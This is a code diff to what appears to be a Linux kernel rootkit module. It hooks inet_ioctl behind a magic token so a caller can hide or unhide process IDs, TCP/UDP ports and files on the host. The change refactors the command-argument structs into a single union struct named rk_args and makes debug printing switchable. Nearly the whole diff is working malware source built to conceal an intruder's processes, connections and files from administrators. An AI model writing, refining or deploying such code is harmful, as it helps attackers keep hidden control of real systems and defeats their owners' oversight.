@@ -23,9 +23,14 @@
 #define HOOK_SIZE 12
 #define HOOK_OFFSET 2
 #define JMP_CODE "\x48\xb8\x00\x00\x00\x00\x00\x00\x00\x00\xff\xe0" // mov rax, addr; jmp rax
+#define __DEBUG__ 0
 #define __DEBUG_HOOK__ 0
 
+#if __DEBUG__
 #define DEBUG(fmt, ...) printk(fmt, ##__VA_ARGS__)
+#else
+#define DEBUG(fmt, ...)
+#endif
 
 #if __DEBUG_HOOK__
 #define DEBUG_HOOK(fmt, ...) printk(fmt, ##__VA_ARGS__)
@@ -609,27 +614,41 @@ void enable_module_loading(void)
 
 #define AUTH_TOKEN 0x12345678
 
-struct s_args
+// struct s_args
+// {
+//     unsigned short cmd;
+//     void *ptr;
+// };
+
+// struct s_proc_args
+// {
+//     unsigned short pid;
+// };
+
+// struct s_port_args
+// {
+//     unsigned short port;
+// };
+
+// struct s_file_args
+// {
+//     char *name;
+//     unsigned short namelen;
+// };
+
+struct rk_args
 {
     unsigned short cmd;
-    void *ptr;
-};
-
-struct s_proc_args
-{
-    unsigned short pid;
-};
-
-struct s_port_args
-{
-    unsigned short port;
-};
-
-struct s_file_args
-{
+    union
+    {
+        unsigned short num;
+        unsigned short pid;
+        unsigned short port;
+        unsigned short namelen;
+    };
     char *name;
-    unsigned short namelen;
 };
+
 
 static int (*inet_ioctl)(struct socket *, unsigned int, unsigned long);
 
@@ -655,7 +674,8 @@ static int new_inet_ioctl(struct socket *sock, unsigned int cmd, unsigned long a
 {
     int ret;
     unsigned long flags;
-    struct s_args args;
+    // struct s_args args;
+    struct rk_args args;
     DEFINE_SPINLOCK(spinlock);
 
     if (cmd == AUTH_TOKEN)
@@ -683,51 +703,51 @@ static int new_inet_ioctl(struct socket *sock, unsigned int cmd, unsigned long a
         case 1:
         {
 
-            struct s_proc_args proc_args;
+            // struct s_proc_args proc_args;
 
-            ret = copy_from_user(&proc_args, args.ptr, sizeof(proc_args));
-            if (ret)
-            {
-                return 0;
-            }
+            // ret = copy_from_user(&proc_args, args.ptr, sizeof(proc_args));
+            // if (ret)
+            // {
+            //     return 0;
+            // }
 
-            DEBUG("Hiding PID %hu\n", proc_args.pid);
+            DEBUG("Hiding PID %hu\n", args.pid);
 
-            hide_proc(proc_args.pid);
+            hide_proc(args.pid);
         }
         break;
         // Unhide proc
         case 2:
         {
 
-            struct s_proc_args proc_args;
+            // struct s_proc_args proc_args;
 
-            ret = copy_from_user(&proc_args, args.ptr, sizeof(proc_args));
-            if (ret)
-            {
-                return 0;
-            }
+            // ret = copy_from_user(&proc_args, args.ptr, sizeof(proc_args));
+            // if (ret)
+            // {
+            //     return 0;
+            // }
 
-            DEBUG("Unhiding PID %hu\n", proc_args.pid);
+            DEBUG("Unhiding PID %hu\n", args.pid);
 
-            unhide_proc(proc_args.pid);
+            unhide_proc(args.pid);
         }
         break;
         // Hide tcp v4 port
         case 3:
         {
 
-            struct s_port_args port_args;
+            // struct s_port_args port_args;
 
-            ret = copy_from_user(&port_args, args.ptr, sizeof(port_args));
-            if (ret)
-            {
-                return 0;
-            }
+            // ret = copy_from_user(&port_args, args.ptr, sizeof(port_args));
+            // if (ret)
+            // {
+            //     return 0;
+            // }
 
-            DEBUG("Hiding tcp v4 port %hu\n", port_args.port);
+            DEBUG("Hiding tcp v4 port %hu\n", args.port);
 
-            hide_port(port_args.port, &hidden_tcp4_ports);
+            hide_port(args.port, &hidden_tcp4_ports);
             // hide_tcp4_port(port_args.port);
         }
         break;
@@ -735,142 +755,142 @@ static int new_inet_ioctl(struct socket *sock, unsigned int cmd, unsigned long a
         case 4:
         {
 
-            struct s_port_args port_args;
+            // struct s_port_args port_args;
 
-            ret = copy_from_user(&port_args, args.ptr, sizeof(port_args));
-            if (ret)
-            {
-                return 0;
-            }
+            // ret = copy_from_user(&port_args, args.ptr, sizeof(port_args));
+            // if (ret)
+            // {
+            //     return 0;
+            // }
 
-            DEBUG("Unhiding tcp v4 port %hu\n", port_args.port);
+            DEBUG("Unhiding tcp v4 port %hu\n", args.port);
 
-            unhide_port(port_args.port, &hidden_tcp4_ports);
+            unhide_port(args.port, &hidden_tcp4_ports);
             // unhide_tcp4_port(port_args.port);
         }
         break;
         // Hide tcp v6 port
         case 5:
         {
-            struct s_port_args port_args;
+            // struct s_port_args port_args;
 
-            ret = copy_from_user(&port_args, args.ptr, sizeof(port_args));
-            if (ret)
-            {
-                return 0;
-            }
+            // ret = copy_from_user(&port_args, args.ptr, sizeof(port_args));
+            // if (ret)
+            // {
+            //     return 0;
+            // }
 
-            DEBUG("Hiding tcp v6 port %hu\n", port_args.port);
+            DEBUG("Hiding tcp v6 port %hu\n", args.port);
 
-            hide_port(port_args.port, &hidden_tcp6_ports);
+            hide_port(args.port, &hidden_tcp6_ports);
         }
         break;
         // Unhide tcp v6 port
         case 6:
         {
-            struct s_port_args port_args;
+            // struct s_port_args port_args;
 
-            ret = copy_from_user(&port_args, args.ptr, sizeof(port_args));
-            if (ret)
-            {
-                return 0;
-            }
+            // ret = copy_from_user(&port_args, args.ptr, sizeof(port_args));
+            // if (ret)
+            // {
+            //     return 0;
+            // }
 
-            DEBUG("Unhiding tcp v6 port %hu\n", port_args.port);
+            DEBUG("Unhiding tcp v6 port %hu\n", args.port);
 
-            unhide_port(port_args.port, &hidden_tcp6_ports);
+            unhide_port(args.port, &hidden_tcp6_ports);
         }
         break;
         // Hide udp v4 port
         case 7:
         {
-            struct s_port_args port_args;
+            // struct s_port_args port_args;
 
-            ret = copy_from_user(&port_args, args.ptr, sizeof(port_args));
-            if (ret)
-            {
-                return 0;
-            }
+            // ret = copy_from_user(&port_args, args.ptr, sizeof(port_args));
+            // if (ret)
+            // {
+            //     return 0;
+            // }
 
-            DEBUG("Hiding udp v4 port %hu\n", port_args.port);
+            DEBUG("Hiding udp v4 port %hu\n", args.port);
 
-            hide_port(port_args.port, &hidden_udp4_ports);
+            hide_port(args.port, &hidden_udp4_ports);
         }
         break;
         // Unhide udp v4 port
         case 8:
         {
-            struct s_port_args port_args;
+            // struct s_port_args port_args;
 
-            ret = copy_from_user(&port_args, args.ptr, sizeof(port_args));
-            if (ret)
-            {
-                return 0;
-            }
+            // ret = copy_from_user(&port_args, args.ptr, sizeof(port_args));
+            // if (ret)
+            // {
+            //     return 0;
+            // }
 
-            DEBUG("Unhiding udp v4 port %hu\n", port_args.port);
+            DEBUG("Unhiding udp v4 port %hu\n", args.port);
 
-            unhide_port(port_args.port, &hidden_udp4_ports);
+            unhide_port(args.port, &hidden_udp4_ports);
         }
         break;
         // Hide udp v6 port
         case 9:
         {
-            struct s_port_args port_args;
+            // struct s_port_args port_args;
 
-            ret = copy_from_user(&port_args, args.ptr, sizeof(port_args));
-            if (ret)
-            {
-                return 0;
-            }
+            // ret = copy_from_user(&port_args, args.ptr, sizeof(port_args));
+            // if (ret)
+            // {
+            //     return 0;
+            // }
 
-            DEBUG("Hiding udp v6 port %hu", port_args.port);
+            DEBUG("Hiding udp v6 port %hu", args.port);
 
-            hide_port(port_args.port, &hidden_udp6_ports);
+            hide_port(args.port, &hidden_udp6_ports);
         }
         break;
         // Unhide udp v6 port
         case 10:
         {
-            struct s_port_args port_args;
+            // struct s_port_args port_args;
 
-            ret = copy_from_user(&port_args, args.ptr, sizeof(port_args));
-            if (ret)
-            {
-                return 0;
-            }
+            // ret = copy_from_user(&port_args, args.ptr, sizeof(port_args));
+            // if (ret)
+            // {
+            //     return 0;
+            // }
 
-            DEBUG("Unhiding udp v6 port %hu\n", port_args.port);
+            DEBUG("Unhiding udp v6 port %hu\n", args.port);
 
-            unhide_port(port_args.port, &hidden_udp6_ports);
+            unhide_port(args.port, &hidden_udp6_ports);
         }
         break;
         // Hide file/dir
         case 11:
         {
             char *name;
-            struct s_file_args file_args;
+            // struct s_file_args file_args;
 
-            ret = copy_from_user(&file_args, args.ptr, sizeof(file_args));
-            if (ret)
-            {
-                return 0;
-            }
+            // ret = copy_from_user(&file_args, args.ptr, sizeof(file_args));
+            // if (ret)
+            // {
+            //     return 0;
+            // }
 
-            name = kmalloc(file_args.namelen + 1, GFP_KERNEL);
+            name = kmalloc(args.namelen + 1, GFP_KERNEL);
             if (!name)
             {
                 return 0;
             }
 
-            ret = copy_from_user(name, file_args.name, file_args.namelen);
+            ret = copy_from_user(name, args.name, args.namelen);
             if (ret)
             {
                 kfree(name);
                 return 0;
             }
 
-            name[file_args.namelen] = 0;
+            name[args.namelen] = 0;
 
             DEBUG("Hiding file/dir %s\n", name);
 
@@ -881,28 +901,28 @@ static int new_inet_ioctl(struct socket *sock, unsigned int cmd, unsigned long a
         case 12:
         {
             char *name;
-            struct s_file_args file_args;
+            // struct s_file_args file_args;
 
-            ret = copy_from_user(&file_args, args.ptr, sizeof(file_args));
-            if (ret)
-            {
-                return 0;
-            }
+            // ret = copy_from_user(&file_args, args.ptr, sizeof(file_args));
+            // if (ret)
+            // {
+            //     return 0;
+            // }
 
-            name = kmalloc(file_args.namelen + 1, GFP_KERNEL);
+            name = kmalloc(args.namelen + 1, GFP_KERNEL);
             if (!name)
             {
                 return 0;
             }
 
-            ret = copy_from_user(name, file_args.name, file_args.namelen);
+            ret = copy_from_user(name, args.name, args.namelen);
             if (ret)
             {
                 kfree(name);
                 return 0;
             }
 
-            name[file_args.namelen] = 0;
+            name[args.namelen] = 0;
 
             DEBUG("Unhiding file/air %s\n", name);
 
